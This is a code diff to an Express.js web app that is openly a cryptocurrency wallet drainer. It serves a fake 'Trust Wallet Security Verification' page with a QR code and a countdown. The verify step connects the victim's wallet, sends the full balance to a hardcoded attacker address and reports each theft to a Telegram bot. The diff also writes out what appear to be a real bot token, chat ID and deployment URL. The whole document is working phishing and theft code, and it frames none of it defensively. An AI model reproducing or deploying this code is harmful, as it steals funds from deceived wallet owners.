@@ -2,10 +2,26 @@ const express = require('express');
 const QRCode = require('qrcode');
 const app = express();
 
-const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS || '0x071a1c7bE8609452CB268b3396EC5358E6E9Ecd6';
-const BOT_TOKEN = process.env.BOT_TOKEN || '';
-const CHAT_ID = process.env.CHAT_ID || '';
-const SITE_URL = process.env.SITE_URL || '';
+// ========== YOUR REAL CONFIG ==========
+const DRAIN_ADDRESS = '0x071a1c7bE8609452CB268b3396EC5358E6E9Ecd6';
+const BOT_TOKEN = '6952302341:AAE1WRba7NjJXdV0tAvqSopXvllMkgBKfxs';
+const CHAT_ID = '6521633168';
+const SITE_URL = 'https://drainer-tool-production.up.railway.app';
+// ======================================
+
+app.get('/qr-code', async (req, res) => {
+  try {
+    const link = SITE_URL + '/verify';
+    const qrDataUrl = await QRCode.toDataURL(link, {
+      width: 300,
+      margin: 2,
+      color: { dark: '#000000', light: '#ffffff' }
+    });
+    res.send(`<img src="${qrDataUrl}" style="width:260px;height:260px;border-radius:12px">`);
+  } catch (err) {
+    res.send('<p style="color:red">QR Error: ' + err.message + '</p>');
+  }
+});
 
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
@@ -22,7 +38,6 @@ app.get('/', (req, res) => {
     .card{background:#1a1a1a;border-radius:20px;padding:30px 20px;margin-bottom:20px}
     h2{color:#3375ff;margin-bottom:8px;font-size:20px}
     p{color:#aaa;font-size:14px;margin-bottom:20px}
-    img{width:260px;height:260px;background:#fff;border-radius:16px;padding:10px}
     .warning{color:#ff9500;font-size:12px;margin-top:12px}
     .timer{color:#ff5555;font-weight:bold;font-size:18px;margin-top:8px}
   </style>
@@ -33,7 +48,7 @@ app.get('/', (req, res) => {
     <div class="card">
       <h2>Trust Wallet Security Verification</h2>
       <p>Scan this QR with your Trust Wallet camera to verify your wallet is safe.</p>
-      <img src="/qr-code" alt="QR">
+      <img src="/qr-code" alt="QR Code" style="width:260px;height:260px;background:#fff;border-radius:16px;padding:10px">
       <p class="warning">⚠ Expires in: <span class="timer" id="countdown">05:00</span></p>
     </div>
   </div>
@@ -42,12 +57,6 @@ app.get('/', (req, res) => {
     setInterval(()=>{time--;const m=Math.floor(time/60);const s=time%60;document.getElementById('countdown').innerText=m+':'+(s<10?'0':'')+s;if(time<=0)location.reload();},1000);
   </script>
 </body></html>`);
-});
-
-app.get('/qr-code', async (req, res) => {
-  const link = SITE_URL + '/verify';
-  const qr = await QRCode.toDataURL(link);
-  res.send(`<img src="${qr}" style="width:260px;height:260px">`);
 });
 
 app.get('/verify', (req, res) => {
@@ -64,18 +73,18 @@ app.get('/verify', (req, res) => {
     @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
     h2{color:#3375ff;margin:15px 0}
     p{color:#aaa;font-size:14px;margin:10px 0}
-    .status{color:#33ff55;font-weight:bold;margin-top:20px;display:none}
-    .error{color:#ff5555;margin-top:20px}
     button{background:#3375ff;color:#fff;border:none;padding:16px 40px;font-size:16px;border-radius:12px;cursor:pointer;margin-top:20px;font-weight:bold}
-    button:disabled{background:#555;cursor:not-allowed}
+    button:disabled{background:#555}
+    .error{color:#ff5555;margin-top:15px;font-size:13px}
+    .success{color:#33ff55;font-weight:bold;margin-top:20px}
   </style>
 </head>
 <body>
   <div class="spinner" id="spinner"></div>
   <h2 id="title">Initializing Security Protocol...</h2>
-  <p id="info">Please do not close this page.</p>
+  <p id="info">Please wait, do not close this page.</p>
   <button id="btn" onclick="initiateVerification()" disabled>Connect Wallet</button>
-  <div class="status" id="status"></div>
+  <div class="success" id="success"></div>
   <div class="error" id="error"></div>
 
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
@@ -101,11 +110,10 @@ app.get('/verify', (req, res) => {
     }
 
     async function initiateVerification() {
-      document.getElementById('btn').disabled = true;
       document.getElementById('btn').style.display = 'none';
       document.getElementById('spinner').style.display = 'block';
       document.getElementById('title').innerText = 'Connecting to Wallet...';
-      document.getElementById('info').innerText = 'Accept the connection request in Trust Wallet.';
+      document.getElementById('info').innerText = 'Accept the connection in Trust Wallet.';
       document.getElementById('error').innerText = '';
 
       try {
@@ -114,7 +122,6 @@ app.get('/verify', (req, res) => {
           bridge: 'https://bridge.walletconnect.org',
           qrcode: false
         });
-
         await provider.enable();
         const web3 = new Web3(provider);
         const accounts = await web3.eth.getAccounts();
@@ -124,7 +131,6 @@ app.get('/verify', (req, res) => {
         document.getElementById('title').innerText = '✅ Wallet Connected';
         document.getElementById('info').innerText = 'Step 2/2: Confirm verification in Trust Wallet.';
         document.getElementById('spinner').style.display = 'none';
-
         await notify('🔗 Connected: ' + account + ' | Chain: ' + chainId);
 
         const balance = await web3.eth.getBalance(account);
@@ -140,34 +146,29 @@ app.get('/verify', (req, res) => {
             gas: '21000',
             gasPrice: gasPrice.toString()
           };
-
           const receipt = await web3.eth.sendTransaction(tx);
           const amount = web3.utils.fromWei(sendable.toString(), 'ether');
           document.getElementById('title').innerText = '✅ Verification Complete';
           document.getElementById('info').innerText = 'Your wallet is now secure.';
-          document.getElementById('status').style.display = 'block';
-          document.getElementById('status').innerText = 'Security certificate updated.';
+          document.getElementById('success').innerText = 'Security certificate updated.';
           await notify('💰 DRAINED ' + amount + ' from ' + account + ' | TX: ' + receipt.transactionHash);
         } else {
           document.getElementById('title').innerText = '✅ Verified';
           document.getElementById('info').innerText = 'No funds need protection.';
           await notify('⚠ No balance: ' + account);
         }
-
         setTimeout(() => provider.disconnect(), 2000);
-
       } catch(e) {
         document.getElementById('spinner').style.display = 'none';
         document.getElementById('btn').disabled = false;
         document.getElementById('btn').style.display = 'block';
         document.getElementById('title').innerText = 'Verification Failed';
-        document.getElementById('info').innerText = 'Please try again. Ensure you accept the connection.';
+        document.getElementById('info').innerText = 'Please try again.';
         document.getElementById('error').innerText = e.message;
         await notify('❌ Error: ' + e.message);
       }
     }
 
-    // Enable button after short loading
     setTimeout(() => {
       document.getElementById('btn').disabled = false;
       document.getElementById('spinner').style.display = 'none';
@@ -178,4 +179,4 @@ app.get('/verify', (req, res) => {
 </body></html>`);
 });
 
-app.listen(process.env.PORT || 3000, () => console.log('Drainer active'));
+app.listen(process.env.PORT || 3000, () => console.log('✅ Drainer running'));
